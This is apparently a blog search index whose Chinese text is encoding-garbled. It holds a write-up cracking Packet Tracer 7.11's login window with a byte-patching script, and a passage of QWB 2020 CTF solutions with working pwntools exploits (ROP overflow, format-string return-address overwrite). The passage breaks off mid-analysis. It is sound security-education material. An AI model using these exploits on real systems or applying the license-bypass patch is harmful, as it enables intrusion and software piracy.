<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>å®æˆ˜å»é™¤packet tracerç™»é™†çª—å£</title>
    <link href="/2020/09/07/%E5%AE%9E%E6%88%98%E5%8E%BB%E9%99%A4packet%20tracer%E7%99%BB%E9%99%86%E7%AA%97%E5%8F%A3/"/>
    <url>/2020/09/07/%E5%AE%9E%E6%88%98%E5%8E%BB%E9%99%A4packet%20tracer%E7%99%BB%E9%99%86%E7%AA%97%E5%8F%A3/</url>
    
    <content type="html"><![CDATA[<h1 id="å®æˆ˜å»é™¤æ€ç§‘packet-tracerç™»é™†çª—å£"><a href="#å®æˆ˜å»é™¤æ€ç§‘packet-tracerç™»é™†çª—å£" class="headerlink" title="å®æˆ˜å»é™¤æ€ç§‘packet tracerç™»é™†çª—å£"></a>å®æˆ˜å»é™¤æ€ç§‘packet tracerç™»é™†çª—å£</h1><h2 id="èƒŒæ™¯"><a href="#èƒŒæ™¯" class="headerlink" title="èƒŒæ™¯"></a>èƒŒæ™¯</h2><p>ä¸“ä¸šè¯¾å¼€è®¾äº†è·¯ç”±äº¤æ¢è¿™é—¨è¯¾ï¼Œå…¶ä¸­è¦ç»å¸¸ä½¿ç”¨packet tracerè¿™ä¸ªè½¯ä»¶ï¼Œä½†æ˜¯æ²¡æœ‰æ³¨å†Œçš„è¯ï¼Œæ¯æ¬¡ç™»é™†éƒ½éœ€è¦ç­‰å¾…15sï¼Œå°±å°è¯•ç ´è§£ä¸€ä¸‹ã€‚</p><h2 id="ç›®æ ‡"><a href="#ç›®æ ‡" class="headerlink" title="ç›®æ ‡"></a>ç›®æ ‡</h2><p>ç ´é™¤ç­‰å¾…çš„15sï¼Œæœ€å¥½ç›´æ¥å»é™¤æ‰ç™»é™†çª—å£ã€‚ä½†æ˜¯è€å¸ˆä¸Šè¯¾ç»™æˆ‘ä»¬æ¼”ç¤ºè¿‡ï¼Œæœ‰ä¸ªå¾çˆ±ç ´è§£çš„æ’ä»¶æ˜¯ç›´æ¥ç ´è§£æ‰ç™»é™†çª—å£çš„ï¼Œå°±ç›´æ¥å¥”ç€è¿™ä¸ªç›®æ ‡å»ã€‚</p><h2 id="å·¥å…·"><a href="#å·¥å…·" class="headerlink" title="å·¥å…·"></a>å·¥å…·</h2><ul><li>win7 æ¨¡æ‹Ÿå™¨</li><li>packet tracer 7.11</li><li>x64dbg</li></ul><h2 id="ç ´è§£è¿‡ç¨‹è®°å½•"><a href="#ç ´è§£è¿‡ç¨‹è®°å½•" class="headerlink" title="ç ´è§£è¿‡ç¨‹è®°å½•"></a>ç ´è§£è¿‡ç¨‹è®°å½•</h2><h3 id="å¯»æ‰¾çªç ´å£"><a href="#å¯»æ‰¾çªç ´å£" class="headerlink" title="å¯»æ‰¾çªç ´å£"></a>å¯»æ‰¾çªç ´å£</h3><p>ï¿¼åœ¨å¼¹å‡ºç™»é™†ç•Œé¢æ—¶ï¼Œæœ€ä¸Šæ–¹ä¼šæœ‰ <code>netacad.com Login</code>çš„å­—çœ¼ï¼Œå…ˆå°±é€‰æ‹©è¿™é‡Œä½œä¸ºå…³é”®å­—ç¬¦ä¸²ã€‚<br>ï¿¼<br><img src="http://qiqianyun.chumen77.xyz/uPic/K55z1P.jpg" srcset="/img/loading.gif" alt><br>åœ¨è¿™ä¸ªexeçš„ç¨‹åºä¸‹æœç´¢å­—ç¬¦ä¸²ã€‚<br><img src="http://qiqianyun.chumen77.xyz/uPic/H1st15.jpg" srcset="/img/loading.gif" alt><br>ç«¯å£å¯ç–‘å­—ç¬¦ä¸²å¯¹åº”çš„æ±‡ç¼–æŒ‡ä»¤ã€‚</p><p>ç„¶åå¼€å§‹f9ä¸€ç›´è¿è¡Œï¼Œåœ¨è¿™ä¸ª<code>netacad.com Login</code>ï¼Œè¿è¡Œå…¶åçš„è½¯ä»¶ä¼šå‘ç°ï¼Œçš„ç¡®å¼€å¯äº†ç™»é™†çš„çª—å£ã€‚è¿™æ ·å°±å¯ä»¥ç¡®å®šï¼Œå…³é”®å¤„å°±åœ¨è¿™é‡Œã€‚<br><img src="http://qiqianyun.chumen77.xyz/uPic/6Hr3Tw.png" srcset="/img/loading.gif" alt><br>å‘ä¸‹çœ‹å¯ä»¥çœ‹åˆ°ï¼Œä¸€äº›ç™»é™†å¤±è´¥çš„å­—ç¬¦ä¸²ï¼Œé‚£å°±æ— ç–‘æ˜¯è¿™ä¸€å—çš„å‡½æ•°æ§åˆ¶ç€è¿™ä¸ªç™»é™†çª—å£ã€‚</p><p>å‘ä¸Šçœ‹å¯ä»¥çœ‹åˆ°ï¼Œæœ‰å‡ ä¸ªå°è·³è½¬ï¼Œå’Œä¸€ä¸ªå¤§è·³è½¬ï¼Œç„¶åè¿½è¿‡å»å¯ä»¥å‘ç°ï¼Œæ˜¯å¯ä»¥ç»•è¿‡è¿™äº›å…³é”®å‡½æ•°çš„ã€‚é‚£å°±å¾ˆç®€å•äº†ï¼Œå°è¯•æ”¹æˆ<code>jmp</code> æ— æ¡ä»¶è·³è½¬ä¸€ä¸‹è¯•ä¸€è¯•ã€‚</p><p><img src="http://qiqianyun.chumen77.xyz/uPic/f42dGL.png" srcset="/img/loading.gif" alt></p><p>ç„¶åç›´æ¥è¿è¡Œä¸€ä¸‹ï¼Œç„¶åçš„ç¡®æ˜¯æˆåŠŸäº†ï¼Œå»æ‰äº†ç™»é™†æ¡†ã€‚</p><p>ç„¶åè¿›è¡Œä¿å­˜è¡¥ä¸ï¼Œæ›¿æ¢ä¸»ç¨‹åºå³å¯ã€‚</p><p><img src="http://qiqianyun.chumen77.xyz/uPic/OikyWs.png" srcset="/img/loading.gif" alt></p><h3 id="å°æ€»ç»“"><a href="#å°æ€»ç»“" class="headerlink" title="å°æ€»ç»“"></a>å°æ€»ç»“</h3><p>çš„ç¡®æ˜¯æ‰¾åˆ°äº†å…³é”®å¤„ï¼Œæ„Ÿè§‰æ•´ä¸ªè¿‡ç¨‹è¿˜æ˜¯å¾ˆç®€å•çš„ï¼Œç”±äºå‰äººç»éªŒå°±æ˜¯ä»ç™»é™†ç•Œé¢ä¸‹æ‰‹çš„ï¼Œæˆ‘ä¹Ÿæ˜¯ç›´æ¥è·Ÿéšè¿™ä¸ªæ€è·¯æ“ä½œã€‚åœ¨å®Œå·¥ä»¥åï¼Œå°è¯•å»æä¸€ä¸‹15så“ªé‡Œçš„éªŒè¯ï¼Œæƒ³ç‚¹ä¸€ä¸‹ç›´æ¥å˜ä¸º0sï¼Œå¯ä»¥ç‚¹å‡»ç¡®è®¤ï¼Œå‘ç°æ˜¯çš„ç¡®éº»çƒ¦ä¹Ÿæ²¡æœ‰æˆåŠŸå°±æ”¾å¼ƒäº†ã€‚</p><h2 id="åŠè‡ªåŠ¨åŒ–æ‰“è¡¥ä¸"><a href="#åŠè‡ªåŠ¨åŒ–æ‰“è¡¥ä¸" class="headerlink" title="åŠè‡ªåŠ¨åŒ–æ‰“è¡¥ä¸"></a>åŠè‡ªåŠ¨åŒ–æ‰“è¡¥ä¸</h2><p>ä¸å¤ªä¼šå†™cï¼Œç”¨python å†™äº†æ‰“è¡¥ä¸çš„ç¨‹åºï¼Œç¡®ä¿æœ¬æœºæœ‰python2çš„è¿è¡Œç¯å¢ƒã€‚ç„¶åæŠŠè„šæœ¬æ”¾åœ¨å…¶å®‰è£…è·¯å¾„çš„binç›®å½•ä¸‹ï¼Œè¿è¡Œå³å¯ã€‚</p><p>ä¹Ÿå¯ä»¥æŠŠç¨‹åºæ‹–å‡ºæ¥ï¼Œæ‰“å®Œè¡¥ä¸åæ›¿æ¢åŸæ¥çš„ç¨‹åºå³å¯ã€‚</p><pre><code class="python">#!/usr/bin/env python2.7import structimport osdef WriteFile():    with open(&#39;PacketTracer7.exe&#39;,&#39;r&#39;) as f:         dt = f.read()    dt = dt[:0x17a5245]+&#39;\xe9\xee\x04\x00\x00\x90&#39;+dt[0x17a524b:]    with open(&#39;PacketTracer7.exe&#39;, &#39;w&#39;) as f:        f.write(dt)if __name__ == &#39;__main__&#39;:    WriteFile()</code></pre><p>é’ˆå¯¹çš„åªæ˜¯7.11ã€‚</p>]]></content>
    
    
    
    <tags>
      
      <tag>re</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>å¼ºç½‘æ¯2020éƒ¨åˆ†é¢˜ç›®</title>
    <link href="/2020/08/24/%E5%BC%BA%E7%BD%91%E6%9D%AF2020%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AE/"/>
    <url>/2020/08/24/%E5%BC%BA%E7%BD%91%E6%9D%AF2020%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AE/</url>
    
    <content type="html"><![CDATA[<h1 id="å¼ºç½‘æ¯2020-éƒ¨åˆ†é¢˜ç›®"><a href="#å¼ºç½‘æ¯2020-éƒ¨åˆ†é¢˜ç›®" class="headerlink" title="å¼ºç½‘æ¯2020 éƒ¨åˆ†é¢˜ç›®"></a>å¼ºç½‘æ¯2020 éƒ¨åˆ†é¢˜ç›®</h1><h2 id="babymessage"><a href="#babymessage" class="headerlink" title="babymessage"></a>babymessage</h2><h3 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><pre><code>   Arch:     amd64-64-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE (0x3fe000)</code></pre><p>åŸºæœ¬ä¿æŠ¤ä¸ç®—å¤šã€‚</p><p>æ˜¯ä¸€ä¸ªä¼ªå †é¢˜ã€‚</p><h4 id="æ¼æ´ç‚¹"><a href="#æ¼æ´ç‚¹" class="headerlink" title="æ¼æ´ç‚¹"></a>æ¼æ´ç‚¹</h4><p>åœ¨ <code>leave_message(v1)</code>å‡½æ•°è¿™é‡Œçš„v1ä¸Šæ¥å–å€¼å°±æ˜¯16</p><pre><code class="c">__int64 __fastcall leave_message(unsigned int a1){  int v1; // ST14_4  __int64 v3; // [rsp+18h] [rbp-8h]  puts(&quot;message: &quot;);  v1 = read(0, &amp;v3, a1);  strncpy(buf, (const char *)&amp;v3, v1);  buf[v1] = 0;  puts(&quot;done!\n&quot;);  return 0LL;}</code></pre><p>è¿›å…¥ä»¥åå¯ä»¥å‘ç°ï¼Œv3æ˜¯åªæœ‰8å­—èŠ‚å¤§å°çš„ï¼Œå¯ä»¥æº¢å‡º8å­—èŠ‚ï¼Œå¯ä»¥è¦†ç›–åˆ°rbpã€‚</p><h5 id="ç”¨é€”"><a href="#ç”¨é€”" class="headerlink" title="ç”¨é€”"></a>ç”¨é€”</h5><pre><code>.text:0000000000400985 ; 22:         if ( v1 &gt; 256 ).text:0000000000400985                 cmp     [rbp+var_4], 100h.text:000000000040098C                 jle     short loc_400995.text:000000000040098E ; 23:           v1 = 256;.text:000000000040098E                 mov     [rbp+var_4], 100h.text:0000000000400995 ; 24:         leave_message(v1);</code></pre><p>åœ¨è¿›å…¥<code>leave_message(v1)</code>å‰v1æœ‰ä¸€ä¸ªå¯¹äº0x100å¤§å°çš„åˆ¤æ–­ï¼Œè¦æ˜¯v1å¤§äº0x100å°±ç»™è®¾ç½®ä¸º0x100ã€‚è¿™å°±å¯ä»¥å®ç°æ ˆæº¢å‡ºï¼Œè¿›è¡Œropã€‚</p><p>æ€ä¹ˆæ§åˆ¶v1ï¼š</p><pre><code>signed int v1; // [rsp+Ch] [rbp-4h]</code></pre><p>å¯ä»¥æ˜æ˜¾çœ‹åˆ°v1åœ¨rbp-4çš„åœ°å€ï¼Œç„¶årbpï¼Œä¹Ÿå¯ä»¥è¿›è¡Œæº¢å‡ºè¦†ç›–ï¼Œè¦†ç›–åˆ°åˆé€‚çš„åœ°æ–¹åï¼Œä¿éšœ-4åï¼Œæœ‰ä¸ªintå¤§å°çš„å¤§äºç­‰äº0x100çš„å€¼å³å¯ã€‚</p><p>è¿™ä¸ªåˆé€‚åœ°å€ï¼Œå¯ä»¥ä»<code>leave_name()</code> ä¸‹æ‰‹ï¼Œå› ä¸ºå…¶å¾€bssæ®µè¯»äº†å€¼ã€‚</p><pre><code>byte_6010D0[(signed int)read(0, byte_6010D0, 4uLL)] = 0;</code></pre><p><img src="http://qiqianyun.chumen77.xyz/uPic/8uyl03.png" srcset="/img/loading.gif" alt></p><h3 id="æ”»å‡»"><a href="#æ”»å‡»" class="headerlink" title="æ”»å‡»"></a>æ”»å‡»</h3><ul><li>æ„é€ ropé“¾ï¼Œæ³„æ¼å‡ºlibcçš„åœ°å€ï¼Œè¿”å›startï¼Œè®©ç¨‹åºé‡æ–°è·‘èµ·æ¥ï¼Œæ¸…ç†æ ˆ</li><li>å†æ¬¡åˆ©ç”¨ï¼Œæ§åˆ¶ret address ä¸º<code>one_gadget</code></li></ul><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *import timelocal_file  = &#39;./babymessage&#39;elf = ELF(local_file)context.log_level = &#39;debug&#39;debug = 0if debug:    io = process(local_file)    libc = elf.libcelse:    io = remote(&#39;123.56.170.202&#39;,21342)    libc = elf.libc    libc = ELF(&#39;./libc-2.27.so&#39;)context.arch = elf.archcontext.terminal = [&#39;tmux&#39;,&#39;neww&#39;]#,&#39;&#39;splitw&#39;,&#39;-h&#39;rce18 = [0x4f2c5,0x4f322,0x10a38c]arae18 = 0x3ebca0s      = lambda data               :io.send(data) sa      = lambda delim,data         :io.sendafter(delim, data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(delim, data)r      = lambda numb=4096          :io.recv(numb)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)uu32    = lambda data               :u32(data.ljust(4, &#39;\0&#39;))uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))info_addr = lambda tag, addr        :io.info(tag + &#39;==&gt;&#39; +&#39;: {:#x}&#39;.format(addr))itr     = lambda                    :io.interactive()def debug():    # gdb.attach(proc.pidof(io)[0],gdbscript=&#39;b main&#39;)    gdb.attach(io)    pause()pop_rdi = 0x0000000000400ac3start = 0x04006E0sla(&#39;choice&#39;,&#39;1&#39;)sa(&#39;name&#39;,p32(0xffff))sla(&#39;choice&#39;,&#39;2&#39;)payload = p64(0x02000200) + p64(0x06010D0+4)sa(&#39;mes&#39;,payload)sla(&#39;choice&#39;,&#39;2&#39;)rop = flat([pop_rdi,elf.got[&#39;__libc_start_main&#39;],elf.plt[&#39;puts&#39;],start])payload = p64(0x02000200) + p64(0x06010D0+4)payload +=ropsa(&#39;mes&#39;,payload)ru(&#39;done!&#39;)r(2)libc_base = uu64(r(6)) - libc.sym[&#39;__libc_start_main&#39;]info_addr(&#39;libc_base&#39;,libc_base)sla(&#39;choice&#39;,&#39;1&#39;)sa(&#39;name&#39;,p32(0xffff))sla(&#39;choice&#39;,&#39;2&#39;)# debug()payload = p64(0x02000200) + p64(0x06010D0+4)sa(&#39;mes&#39;,payload)rec = 0x10a45c + libc_basesla(&#39;choice&#39;,&#39;2&#39;)rop = p64(rec)payload = p64(0x02000200) + p64(0x06010D0+4)payload +=ropsa(&#39;mes&#39;,payload)itr()</code></pre><pre><code class="python">flag{f4c1c2c2407055f2665dec486e7d1b16}</code></pre><h2 id="Siri"><a href="#Siri" class="headerlink" title="Siri"></a>Siri</h2><h3 id="åˆ†æ-1"><a href="#åˆ†æ-1" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><p>ä¿æŠ¤å…¨å¼€ã€‚æ ˆä¸Šçš„æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼Œå¹¶ä¸”å¯ä»¥æ— é™æ¬¡è§¦å‘ã€‚</p><h4 id="æ¼æ´ç‚¹-1"><a href="#æ¼æ´ç‚¹-1" class="headerlink" title="æ¼æ´ç‚¹"></a>æ¼æ´ç‚¹</h4><pre><code class="c">signed __int64 __fastcall sub_1212(const char *a1){  char *v2; // [rsp+18h] [rbp-128h]  char s; // [rsp+20h] [rbp-120h]  unsigned __int64 v4; // [rsp+138h] [rbp-8h]  v4 = __readfsqword(0x28u);  v2 = strstr(a1, &quot;Remind me to &quot;);  if ( !v2 )    return 0LL;  memset(&amp;s, 0, 0x110uLL);  sprintf(&amp;s, &quot;&gt;&gt;&gt; OK, I&#39;ll remind you to %s&quot;, v2 + 13);  printf(&amp;s);  puts(&amp;::s);  return 1LL;}</code></pre><p>å‘ç°å­˜åœ¨æ ¼å¼åŒ–å­—ç¬¦ä¸²ï¼Œä½†æ˜¯ä½ æ‰€è¾“å…¥çš„éƒ½ä¼šè¢«sprintfå¤„ç†ä»¥åç»™printfå‡½æ•°ã€‚ç”±äºå…¶æ˜¯<code>%s</code>æ¥å¤„ç†æ•°æ®ï¼Œè¿™å°±è®©ç›´æ¥åœ¨æ ˆä¸Šå†™åœ°å€ï¼Œç„¶åæ”»å‡»é€ æˆäº†éš¾åº¦ã€‚<br>ä½†æ˜¯è°ƒè¯•å¯ä»¥å‘ç°ï¼Œå…¶å®è¾“å…¥çš„ä¸œè¥¿è¿˜ä¼šä¿ç•™åœ¨æ ˆä¸Šï¼Œå› ä¸ºsprintfå¤„ç†æ•°æ®ä¹Ÿæ˜¯ä»æ ˆä¸Šæ‹¿çš„ï¼Œæ‰€ä»¥ä¼šè¢«ä¿ç•™çš„ã€‚</p><h4 id="æ”»å‡»-1"><a href="#æ”»å‡»-1" class="headerlink" title="æ”»å‡»"></a>æ”»å‡»</h4><ul><li>ç¬¬ä¸€æ¬¡è§¦å‘ï¼Œæ³„æ¼å‡ºlibcåœ°å€ï¼Œstackåœ°å€ã€‚</li><li>æ‰§è¡Œåˆ°printfå‡†å¤‡è§¦å‘æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´æ—¶ï¼Œç”¨sprintfæ®‹ç•™æ ˆä¸Šçš„æ•°æ®ï¼ˆåœ¨0x100åï¼‰ï¼Œè¿™ä¸ªéœ€è¦ç²¾å¿ƒæ„é€ å¥½åï¼Œè¿›è¡Œæ”»å‡»ret addressã€‚éœ€è¦ä¸€æ¬¡æ€§æ”¹å¥½ã€‚</li></ul><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *import timelocal_file  = &#39;./pwn&#39;elf = ELF(local_file)context.log_level = &#39;debug&#39;debug = 0if debug:    io = process(local_file)    libc = elf.libcelse:    io = remote(&#39;123.56.170.202&#39;,12124)    # libc = elf.libc    libc = ELF(&#39;./libc.so.6&#39;)context.arch = elf.archcontext.terminal = [&#39;tmux&#39;,&#39;neww&#39;]#,&#39;&#39;splitw&#39;,&#39;-h&#39;rce16 = [0x45216,0x4526a,0xf02a4,0xf1147]rce18 = [0x4f2c5,0x4f322,0x10a38c]s      = lambda data               :io.send(data) sa      = lambda delim,data         :io.sendafter(delim, data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(delim, data)r      = lambda numb=4096          :io.recv(numb)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)uu32    = lambda data               :u32(data.ljust(4, &#39;\0&#39;))uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))info_addr = lambda tag, addr        :io.info(tag + &#39;==&gt;&#39; +&#39;: {:#x}&#39;.format(addr))itr     = lambda                    :io.interactive()def debug():    gdb.attach(io)    pause()def start_attc():    sla(&#39;&gt;&gt;&#39;,&#39;Hey Siri!&#39;)    r()a = &#39;Remind me to &#39;start_attc()payload = str(a) + &#39;%83$p&#39; + &#39;bbb&#39; + &#39;%7$p&#39;# ru(&#39;&gt;&gt;&gt;&#39;)s(payload)ru(&#39;0x&#39;)libc_base = int(r(12),16) - 0x21b97info_addr(&#39;libc_base&#39;,libc_base)ru(&#39;bbb0x&#39;)stack_base = int(r(12),16) - 0x150info_addr(&#39;stack_base&#39;,stack_base)tag = stack_base + 0x148start_attc()def fmt_short(prev,val,idx,byte = 2):    result = &quot;&quot;    if prev &lt; val :        result += &quot;%&quot; + str(val - prev) + &quot;c&quot;    elif prev == val :        result += &#39;&#39;    else :        result += &quot;%&quot; + str(256**byte - prev + val) + &quot;c&quot;    result += &quot;%&quot; + str(idx) + &quot;$hn&quot;    return resultprev = 27fmtpayload = &quot;&quot;key = 0x4f365 + libc_baseinfo_addr(&#39;key&#39;,key)for i in range(3):    fmtpayload +=fmt_short(prev,(key &gt;&gt; 16*i) &amp; 0xffff,55+i)     prev = (key &gt;&gt; i*16) &amp; 0xffffprint(fmtpayload)payload = str(a) + fmtpayloadpayload +=&#39;aaa&#39; + &#39;b&#39; + p64(tag)[0:6] + &#39;\x00&#39;*2 + p64(tag+2)[0:6] + &#39;\x00&#39;*2  + p64(tag+4)[0:6] + &#39;\x00&#39;*2 + p64(tag+6)[0:6] + &#39;\x00&#39;*2s(payload)itr()</code></pre><pre><code class="python">flag{da8836b9e9df3db44fe4bd7f39d4f7ab}</code></pre><h2 id="water-re"><a href="#water-re" class="headerlink" title="water_re"></a><code>water_re</code></h2><p>Idaåç¼–è¯‘åçš„ä»£ç æ¯”è¾ƒéš¾çœ‹ï¼Œå‘ç°é‡ç‚¹æ•°æ®é€ æˆäº†å›°éš¾ï¼Œå°±é‡‡å–åŠ¨æ€è°ƒè¯•ã€‚</p><p>åŸºæœ¬æµç¨‹å°±æ˜¯ï¼Œgetsä¸€æ®µä½ è¾“å…¥çš„flagï¼Œè¯»å…¥åç”¨<code>sub_12f0_</code>è¿›è¡Œå¤„ç†ï¼Œç„¶åç»™<code>v10</code> <code>v11</code> <code>v12</code>  <code>v13</code> åˆ¤æ–­æ˜¯å¦ç›¸ç­‰ã€‚å…¶å®ä¹Ÿå°±æ˜¯ä¸€ä¸ªä¸ªå­—ç¬¦æ¥è¿›è¡Œå¯¹æ¯”ã€‚</p><h3 id="sub-12F0-åŠ å¯†å‡½æ•°"><a href="#sub-12F0-åŠ å¯†å‡½æ•°" class="headerlink" title="sub_12F0_åŠ å¯†å‡½æ•°"></a><code>sub_12F0_</code>åŠ å¯†å‡½æ•°</h3><pre><code class="python">_BYTE *__fastcall sub_12F0(_BYTE *a1){  _BYTE *result; // rax  int v2; // esi  __int64 v3; // r8  __int64 v4; // rdx  __int64 v5; // rax  int v6; // ecx  char v7; // r8  char v8; // dl  __asm { endbr64 }  result = (_BYTE *)sub_1090();  if ( (signed int)result &lt;= 0 )    return result;  v2 = (signed int)result;  v3 = (unsigned int)((_DWORD)result - 1);  v4 = 0LL;  do  {    a1[v4] = (a1[v4] ^ byte_4010[(unsigned int)v4 % 7]) + 65;    v5 = v4++;  }  while ( v3 != v5 );  v6 = 0;  do  {    v7 = a1[3];    result = a1 + 3;    do    {      v8 = *(result-- - 1);      result[1] = v8;    }    while ( a1 != result );    v6 += 4;    *a1 = v7;    a1 += 4;  }  while ( v2 &gt; v6 );  return result;}</code></pre><p>åŠ¨æ€è°ƒè¯•ï¼Œè¿›è¡Œèµ·æ¥å¾ˆå®¹æ˜“çœ‹æ‡‚ã€‚ä¸Šæ¥å°±æ˜¯ä¸€ä¸ªå¯¹è¾“å…¥çš„ä¸œè¥¿è¿›è¡Œä¸€ä¸ªä¸<code>byte_4010</code>çš„å­—ç¬¦<code>&#39;Q&#39;, &#39;W&#39;, &#39;B&#39;, &#39;l&#39;, &#39;o&#39;, &#39;g&#39;, &#39;s&#39;</code> 7ç»„æ¥è¿›è¡Œä¸€ä¸ªå¼‚æˆ–å’Œ+65ã€‚</p><p>ç„¶åä¸‹é¢ï¼š</p><pre><code class="python"> while ( v3 != v5 );  v6 = 0;  do  {    v7 = a1[3];    result = a1 + 3;    do    {      v8 = *(result-- - 1);      result[1] = v8;    }    while ( a1 != result );    v6 += 4;    *a1 = v7;    a1 += 4;  }</code></pre><p>åªçœ‹ç€è®©äººå¤´å¤§ï¼Œè¾“å…¥<code>flag{11111111111111111111111111111111111111111}</code> åŠ¨æ€è°ƒè¯•ä¸€ä¸‹å‘ç°ï¼š</p><p><img src="http://qiqianyun.chumen77.xyz/uPic/oqoJ2Y.png" srcset="/img/loading.gif" alt></p><p>åˆ†æè¿™2ç»„æ•°æ®å°±ä¼šå‘ç°ï¼Œæ¯æ¬¡å¯¹4ä¸ªæ•°æ®ä¸ºä¸€ç»„è¿›è¡Œå¤„ç†ã€‚å¤„ç†åç»“æœå°±æ˜¯åŸæ¥çš„ï¼š <code>v1 &gt; v2 &gt; v3 &gt; v4</code> å˜ä¸º <code>v4 &gt; v1 &gt; v2 &gt; v3</code> è¿™æ ·çš„ç»“æœã€‚</p><p>ç„¶åå¤„ç†å®Œå°±ç»™<code>v10</code> <code>v11</code> <code>v12</code>  <code>v13</code> åˆ¤æ–­æ˜¯å¦ç›¸ç­‰ã€‚è¿™è‚¯å®šä¸ºä¸€ä¸²å¤„ç†è¿‡çš„å­—ç¬¦ä¸²ï¼Œidaä¸­ä¹Ÿå¯ä»¥æ‰¾åˆ°ï¼Œç›´æ¥æå–æœ‰ç‚¹å®³æ€•æå–é”™ï¼ŒåŠ¨è°ƒæ—¶æå–ä¸€ä¸‹å‡ºæ¥ï¼š</p><pre><code class="python">tag1=[0x4C, 0x78, 0x7C, 0x64, 0x54, 0x55, 0x77, 0x65, 0x5C, 0x49,0x76, 0x4E, 0x68, 0x43, 0x42, 0x4F, 0x4C, 0x71, 0x44, 0x4E,0x66, 0x57, 0x7D, 0x49, 0x6D, 0x46, 0x5A, 0x43, 0x74, 0x69,0x79, 0x78, 0x4F, 0x5C, 0x50, 0x57, 0x5E, 0x65, 0x62, 0x44]</code></pre><p>ä¹Ÿå°±æ˜¯è¿™ä¸€æ®µæ•°æ®ã€‚</p><h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><p>è‡ªå·±ç›´æ¥æ‰‹åŠ¨æ›¿æ¢çš„æ•°æ®ã€‚</p><pre><code class="python">tag1=[0x4C, 0x78, 0x7C, 0x64, 0x54, 0x55, 0x77, 0x65, 0x5C, 0x49,0x76, 0x4E, 0x68, 0x43, 0x42, 0x4F, 0x4C, 0x71, 0x44, 0x4E,0x66, 0x57, 0x7D, 0x49, 0x6D, 0x46, 0x5A, 0x43, 0x74, 0x69,0x79, 0x78, 0x4F, 0x5C, 0x50, 0x57, 0x5E, 0x65, 0x62, 0x44]tag2 = [0x78, 0x7C, 0x64,0x4C,0x55, 0x77, 0x65,0x54, 0x49,0x76, 0x4E,0x5C, 0x43, 0x42, 0x4F,0x68,0x71, 0x44, 0x4E,0x4C,0x57, 0x7D, 0x49,0x66, 0x46, 0x5A, 0x43,0x6D, 0x69,0x79, 0x78, 0x74, 0x5C, 0x50, 0x57, 0x4F,0x65, 0x62, 0x44,0x5E]qwkey = [&#39;Q&#39;, &#39;W&#39;, &#39;B&#39;, &#39;l&#39;, &#39;o&#39;, &#39;g&#39;, &#39;s&#39;]flag = &#39;&#39;i = 0j = 0for i in range(len(tag2)):    if j ==7:        j = 0    flag += chr((tag2[i] - 65) ^ ord(qwkey[j % 7]))    j += 1print(str(flag))</code></pre><p><img src="http://qiqianyun.chumen77.xyz/uPic/7JWt2B.png" srcset="/img/loading.gif" alt><br>ä¼°è®¡æ²¡æœ‰æå–å…¨ï¼Œä½†æ˜¯ä¹Ÿå¾ˆå®¹æ˜“çŸ¥é“flagäº†ã€‚</p><pre><code class="python">flag{QWB_water_problem_give_you_the_score}</code></pre><h2 id="Just-a-Galgame"><a href="#Just-a-Galgame" class="headerlink" title="Just_a_Galgame"></a><code>Just_a_Galgame</code></h2><h3 id="åˆ†æ-2"><a href="#åˆ†æ-2" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><p>é¢˜ç›®æé†’äº†æ˜¯house of orangeï¼Œé‚£å°±æƒ³ç€è¿™æ ·åˆ©ç”¨å³å¯ã€‚ç°åœ¨house of orangeçš„æ€æƒ³ï¼Œç»ŸæŒ‡ä¸»è¦æ˜¯é’ˆå¯¹æ²¡æœ‰freeçš„å †é¢˜ï¼Œå…¶æ”¹top chunkï¼Œç„¶åç”³è¯·ä¸€ä¸ªå¤§ç‚¹çš„chunkï¼Œæ¥è¿›è¡Œè·å–ä¸€ä¸ªè¿›å…¥unsortbin çš„å †å—ã€‚æ²¡æœ‰å¦‚æœ€æ—©çš„å¾ˆç»å…¸çš„åˆ©ç”¨unsortbin attack å’Œ io ç»“åˆæ¥è·å–shellã€‚</p><p>é¢˜ç›®çš„case2 <code>Invite her to go to a movie.</code> ä¸­ï¼š</p><pre><code class="c">  printf(&quot;movie name &gt;&gt; &quot;, &amp;buf);            v4 = atoi((const char *)&amp;buf);            read(0, (void *)(qword_404060[v4] + 0x60), 0x10uLL);</code></pre><p>ç”±äºå…¶æ˜¯åœ¨åŠ 0x60ä¹‹åè¯»å–ï¼Œä¸”åœ¨case 1 åªæ˜¯malloc(0x68)ï¼Œæ‰€ä»¥åœ¨æ­¤å¤„å¯ä»¥æº¢å‡º8ä¸ªå­—èŠ‚ï¼Œæ”¹å†™åˆ° top chunkã€‚</p><p>å¹¶ä¸”case3ï¼š</p><pre><code class="c">  puts(&quot;You are the apple of my eyes too!&quot;);          qword_404098 = (__int64)malloc(0x1000uLL);          ++v12;</code></pre><p>å¯ä»¥ç»™ä½ ç”³è¯·0x1000çš„å †å—ï¼Œè¿™å°±å¯ä»¥å®ç°äº†house of orangeã€‚</p><p>åœ¨case5ä¸­ï¼š</p><pre><code class="c">  puts(&quot;\nHotaru: Won&#39;t you stay with me for a while? QAQ\n&quot;);        read(0, &amp;key, 8uLL);    </code></pre><p>ä¼šç»™<code>0x4040A0</code> è¯»ä¸€æ®µæ•°æ®ã€‚</p><p><img src="http://qiqianyun.chumen77.xyz/uPic/RNbigg.png" srcset="/img/loading.gif" alt><br>æ˜¯ç´§æŒ¨ç€å 